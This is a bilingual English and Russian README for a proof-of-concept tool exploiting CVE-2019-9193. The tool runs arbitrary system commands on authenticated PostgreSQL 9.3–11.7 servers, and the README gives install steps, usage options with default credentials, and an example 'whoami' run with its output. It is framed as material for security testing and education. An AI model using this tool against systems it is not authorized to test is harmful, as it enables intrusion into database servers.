
# EN
**GenPostgresRCEExploit** is a PoC tool designed to exploit an authenticated Remote Code Execution (RCE) vulnerability in specific versions of PostgreSQL (9.3 - 11.7). It allows authenticated users to execute system commands on a PostgreSQL database server that is vulnerable to CVE-2019-9193.

## Features
- **Exploitation of RCE**: Executes system commands through an authenticated PostgreSQL session.
- **Version Check**: Validates the version of the target PostgreSQL server to confirm the vulnerability.
- **Command Execution**: Allows custom command execution on the server if it is vulnerable.
- **Automatic Table Management**: Creates and deletes a temporary table for command execution without manual intervention.

## Requirements
- Python 3.x
- PostgreSQL client library (`psycopg2` package)

## Installation
1. Clone the repository:
    ```bash
    git clone https://github.com/geniuszly/CVE-2019-9193
    cd CVE-2019-9193
    ```
2. Install the required packages:
    ```bash
    pip install -r requirements.txt
    ```

## Usage
```bash
python3 GenPostgresRCEExploit.py -i <target_ip> -p <port> -d <database_name> -U <username> -P <password> -c "<system_command>"
```

### Options
- `-i`, `--ip`: IP address of the PostgreSQL server (Default: 127.0.0.1)
- `-p`, `--port`: Port of the PostgreSQL server (Default: 5432)
- `-d`, `--database`: Name of the PostgreSQL database (Default: template1)
- `-U`, `--user`: Username to connect to the PostgreSQL server (Default: postgres)
- `-P`, `--password`: Password to connect to the PostgreSQL server (Default: postgres)
- `-c`, `--command`: System command to be executed on the server
- `-t`, `--timeout`: Connection timeout in seconds (Default: 10)

## Example
```bash
python3 GenPostgresRCEExploit.py -i 192.168.1.10 -p 5432 -d mydb -U myuser -P mypass -c "whoami"
```
This example connects to a PostgreSQL server at `192.168.1.10`, authenticates with the provided credentials, and executes the `whoami` command.

## Example output
```
$ python3 GenPostgresRCEExploit.py -i 192.168.1.10 -p 5432 -d testdb -U postgres -P mypassword -c "whoami"

[+] Подключение к базе данных PostgreSQL на 192.168.1.10:5432
[+] Соединение успешно установлено
[+] Проверка версии PostgreSQL
[+] Уязвимая версия PostgreSQL обнаружена: 10.4
[+] Создание временной таблицы: temp_3f8b8f9e2c9c11d7bd8f7c61d4e9eaf2
[+] Команда успешно выполнена

postgres
```

## Disclaimer
This tool is intended for educational purposes and ethical testing only. Unauthorized use of this tool against any systems is illegal and strictly prohibited. The authors do not take responsibility for any misuse.



# RU
**GenPostgresRCEExploit** — это PoC-эксплойт, разработанный для эксплуатации уязвимости удаленного выполнения кода (RCE) в определенных версиях PostgreSQL (9.3 - 11.7). Программа позволяет аутентифицированным пользователям выполнять системные команды на сервере PostgreSQL, уязвимом к CVE-2019-9193.

## Возможности
- **Эксплуатация RCE**: Выполнение системных команд через аутентифицированное соединение с PostgreSQL.
- **Проверка версии**: Проверяет версию целевого сервера PostgreSQL на наличие уязвимости.
- **Выполнение команд**: Позволяет выполнять произвольные команды на сервере при наличии уязвимости.
- **Управление таблицами**: Автоматически создает и удаляет временную таблицу для выполнения команд.

## Требования
- Python 3.x
- Клиентская библиотека PostgreSQL (`psycopg2` пакет)

## Установка
1. Клонируйте репозиторий:
    ```bash
    git clone https://github.com/geniuszly/CVE-2019-9193
    cd CVE-2019-9193
    ```
2. Установите необходимые пакеты:
    ```bash
    pip install -r requirements.txt
    ```

## Использование
```bash
python3 GenPostgresRCEExploit.py -i <IP-адрес> -p <порт> -d <имя_базы_данных> -U <пользователь> -P <пароль> -c "<системная_команда>"
```

### Опции
- `-i`, `--ip`: IP-адрес сервера PostgreSQL (По умолчанию: 127.0.0.1)
- `-p`, `--port`: Порт сервера PostgreSQL (По умолчанию: 5432)
- `-d`, `--database`: Имя базы данных PostgreSQL (По умолчанию: template1)
- `-U`, `--user`: Имя пользователя для подключения к серверу PostgreSQL (По умолчанию: postgres)
- `-P`, `--password`: Пароль для подключения к серверу PostgreSQL (По умолчанию: postgres)
- `-c`, `--command`: Системная команда для выполнения на сервере
- `-t`, `--timeout`: Тайм-аут подключения в секундах (По умолчанию: 10)

## Пример
```bash
python3 GenPostgresRCEExploit.py -i 192.168.1.10 -p 5432 -d mydb -U myuser -P mypass -c "whoami"
```
В этом примере программа подключается к серверу PostgreSQL по адресу `192.168.1.10`, проходит аутентификацию с указанными данными и выполняет команду `whoami`.

## Пример вывода
```
$ python3 GenPostgresRCEExploit.py -i 192.168.1.10 -p 5432 -d testdb -U postgres -P mypassword -c "whoami"

[+] Подключение к базе данных PostgreSQL на 192.168.1.10:5432
[+] Соединение успешно установлено
[+] Проверка версии PostgreSQL
[+] Уязвимая версия PostgreSQL обнаружена: 10.4
[+] Создание временной таблицы: temp_3f8b8f9e2c9c11d7bd8f7c61d4e9eaf2
[+] Команда успешно выполнена

postgres
```

## Отказ от ответственности
Данный инструмент предназначен исключительно для образовательных целей и легального тестирования. Несанкционированное использование данного инструмента против любых систем является незаконным и строго запрещено. Авторы не несут ответственности за любое неправомерное использование.

